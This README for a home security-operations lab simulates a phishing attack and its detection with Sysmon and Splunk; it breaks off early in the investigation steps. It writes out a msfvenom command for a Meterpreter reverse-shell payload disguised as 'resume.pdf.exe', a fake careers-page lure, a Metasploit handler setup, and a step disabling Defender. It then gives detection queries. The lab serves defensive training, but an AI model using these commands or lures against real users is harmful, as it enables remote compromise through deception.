# Phishing Reverse-Shell SOC Lab (Windows + Kali + Splunk)
## Overview
This lab simulates a phishing attack where a user on a Windows 10 machine opens a malicious attachment (`resume.pdf.exe`) delivered from a fake careers web page hosted on Kali Linux. Sysmon collects process and network telemetry, which is ingested into Splunk for detection and investigation. The project demonstrates end-to-end SOC skills: log collection, detection logic, and incident analysis.
## Architecture
- **Host:** Windows 10 laptop running VirtualBox
- **Victim:** Windows 10 VM
  - IP: `192.168.56.10`
  - Network: `Internal Network`
  - Tools: Sysmon, Splunk Enterprise (index `endpoint`)
- **Attacker:** Kali Linux VM
  - IP: `192.168.56.11`
  - Network: same `Internal Network`
  - Tools: Nmap, msfvenom, Metasploit, Python HTTP server
### Architecture Diagram (ASCII)
            +--------------------------+
            |   Windows 10 Host       |
            |   (runs VirtualBox)     |
            +------------+------------+
                         |
            Internal Network (no Internet)
                         |
    +--------------------+--------------------+
    |                                         |
    +-------v--------+ +-------v--------+
    | Kali Linux | | Windows 10 |
    | Attacker VM | | Victim VM |
    | 192.168.56.11 | | 192.168.56.10 |
    | - Fake careers | resume.pdf.exe ---> | - User opens |
    | web page | <--- reverse shell | attachment |
    | - Metasploit | | - Sysmon + |
    +-------+--------+ | Splunk |
    | +-------+-------+
    | |
    +---------------- Sysmon logs ------------+
    to Splunk (index=endpoint)


## Setup Steps

### 1. VM Installation & Networking

1. Create two VMs in VirtualBox:
   - Windows 10 (victim)
   - Kali Linux (attacker)
2. For both VMs:
   - Network Adapter 1 → **Internal Network**
   - Use the same network name (e.g., `soc-lab`).
3. Assign static IPs:
   - Windows: `192.168.56.10/24`
   - Kali: `192.168.56.11/24`
4. Verify connectivity:
   - From Kali: `ping 192.168.56.10`
   - From Windows: `ping 192.168.56.11`

### 2. Sysmon + Splunk on Windows

1. Install **Sysmon** and a suitable config (e.g., SwiftOnSecurity or custom).
2. Confirm events under:
   - Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational
3. Install **Splunk Enterprise** (all-in-one) on the Windows VM.
4. In Splunk:
   - Create index: `endpoint`
5. Place `config/inputs.conf` in:
   
   **C:\Program Files\Splunk\etc\system\local\inputs.conf**

   **Minimal `inputs.conf`**:
   
   [WinEventLog://Security]
   
   index = endpoint
   
   disabled = 0
   
   [WinEventLog://Application]
   
   index = endpoint
   
   disabled = 0

   [WinEventLog://Microsoft-Windows-Sysmon/Operational]
   
   index = endpoint
   
   disabled = 0

7. Restart Splunk (`splunk restart` or restart Splunkd service).
8. Validate ingestion:

   index=endpoint earliest=-15m
   | stats count by sourcetype

   You should see at least:
   - `WinEventLog:Security`
   - `WinEventLog:Application`
   - `WinEventLog:Microsoft-Windows-Sysmon/Operational`

### 3. Attacker Setup on Kali

1. Generate payload:
    msfvenom -p windows/x64/meterpreter/reverse_#tcp LHOST=192.168.56.11 LPORT=4444 -f exe -o resume.pdf.exe

2. Create a simple fake careers page (`index.html`) in the same folder:
   <!DOCTYPE html> <html> <head> <title>Careers - Application Portal</title> </head> <body> <h2>Thank you for applying</h2> <p>Please download the attached resume for          review:</p> <a href="resume.pdf.exe">Download candidate resume (PDF)</a> </body> </html> ```

3. Start HTTP server:
   python3 -m http.server 8888
   
4. Start Metasploit handler:
   msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.11
set LPORT 4444
exploit

### 4. Simulated Phishing Execution
On the Windows VM:
1. Browse to http://192.168.56.11:8888.
2. Download resume.pdf.exe from the fake careers page.
3. Temporarily disable Windows Defender real-time protection.
4. Double-click resume.pdf.exe to execute.
5. (Optional) Confirm reverse shell in Metasploit on Kali.

### Detection Logic
Full queries are in SPL/queries.md. Key examples:

**1. Confirm logging**

- `index=endpoint earliest=-15m`

  `| stats count by sourcetype`

**2. Detect specific malicious attachment**

- `index=endpoint earliest=-7d`

  `| search "resume.pdf.exe"`

**3. Detect EXEs executed from user profile folders**

- `index=endpoint earliest=-7d`

  `| search Image="*\\Users\\*\\Downloads\\*.exe" OR Image="*\\Users\\*\\Desktop\\*.exe"`

**4. Detect outbound connection to attacker C2**

- `index=endpoint earliest=-7d`

  `| search "192.168.56.11" "4444"`

### Investigation Steps

When an alert/detection fires:

**1. Identify the process**

Search:

   - `index=endpoint "resume.pdf.exe" earliest=-30m`

Look at:

   - Image (full path)

   - ParentImage (who launched it, e.g., explorer.exe)

   - User (account that executed it)

   - CommandLine

2. 

